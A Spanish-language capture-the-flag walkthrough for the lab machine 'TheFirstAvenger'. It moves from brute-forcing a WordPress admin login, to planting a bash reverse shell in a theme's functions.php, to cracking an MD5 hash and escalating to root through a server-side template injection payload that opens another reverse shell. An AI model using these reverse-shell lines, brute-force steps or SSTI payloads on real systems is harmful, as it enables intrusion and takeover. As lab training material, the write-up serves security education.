PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-Hacemos fuzzing al puerto 80 y encontramos una ruta /wp1 que nos lleva a un Wordpress

-Usamos wpscan para enumerar el wordpress:
	-wpscan --url http://192.168.1.153/wp1
		-No detecta ni usuarios ni plugins

-Navegando por la web observamos que está haciendo vitual hosting, añadimos el siguiente dominio al /etc/hosts:
	-thefirstavenger.thl

-Volvemos a escanear la web con wpscan:
	-wpscan --url http://thefirstavenger.thl/wp1/ -e ap,u
		-Esta ves nos encuentra el usuario:
			-admin

-Realizamos un ataque de fuerza bruta al usuario admin con wpscan:
	-wpscan --url http://thefirstavenger.thl/wp1/ -U admin -P /usr/share/wordlists/rockyou.txtwp
		-admin:spongebob

-Nos vamos a /wp-admin y nos autenticamos con las credenciales obtenidas

-Dentro del dashboard de wordpress, ganamos acceso a la máquina de la siguiente manera:
	-Herramientas --> Editor de archivos de temas --> Twenty-Twenty-Two --> Functions.php
		exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.135/1234 0>&1'");
		
-Lo ejecutamos desde la siguiente ruta y obtenemos conexión:
	-http://thefirstavenger.thl/wp1/wp-content/themes/twentytwentytwo/functions.php
		www-data@TheHackersLabs-Thefirstavenger:/$


## Escalada de Privilegios

-Nos vamos a /var/www/html/wp1/wp-config.php y encontramos la credenciales para mysql:
	/** Database username */
	define( 'DB_USER', 'wordpress' );
	/** Database password */
	define( 'DB_PASSWORD', '9pXYwXSnap`4pqpg~7TcM9bPVXY&~RM9i3nnex%r' );

-Nos conectamos a mysql en localhost:
	-mysql -uwordpress -p
	-password: 9pXYwXSnap`4pqpg~7TcM9bPVXY&~RM9i3nnex%r

-Nos vamos a la BBDD top_secret y rompemos el hash de steve con john
	-john --wordlist=/usr/share/wordlists/rockyou.txt hash_steve.txt --format=Raw-MD5
		thecaptain       

-Pivotamos al usuario steve:
	-su steve
	-password: thecaptain
	steve@TheHackersLabs-Thefirstavenger:~$

-He probado todas las técnicas que suelo hacer para escalar privilegios a root, sin exito

-Vemos que el puerto ssh está abierto y que el puerto 7092 está abierto localmente:
	-ss -tan:
		127.0.0.1:7092

-Vamos a efectuar un Local Port Forwarding para traernos el puerto 7092 de la máquina víctima a nuestra máquina:
	-ssh steve@192.168.1.153 -L 8111:127.0.0.1:7092
	(Nos traemos el contenido del puerto 7092 de la máquina víctima al puerto 8111 de nuestra máquina local)

-Para ver el contenido, ponemos en la URL:
	-http://localhost:8111/

-Nos sale un input para poner una dirección Ip y ejecutar un 'ping'

-Cuando ponemos cualquier cosa en el input la URL queda así:
	-http://localhost:8111/?ip=192.168.1.135

-El patrón --> /?algo en una URL suele ser vulnerable a SSTI

-Es vulnerable a SSTI (Server Side Template Injection):
	-http://localhost:8111/?ip={{7*7}}
		-En el input aparece 49, lo que confirma la vulnerabilidad

-Obtenemos acceso a la máquina como root introduciento el siguiente Payload:
	-http://localhost:8111/?ip={{ self.__init__.__globals__.__builtins__.__import__('os').popen("bash -c 'bash -i >%26 /dev/tcp/192.168.1.135/4444 0>%261'").read() }}
		root@TheHackersLabs-Thefirstavenger:/# whoami
		whoami
		root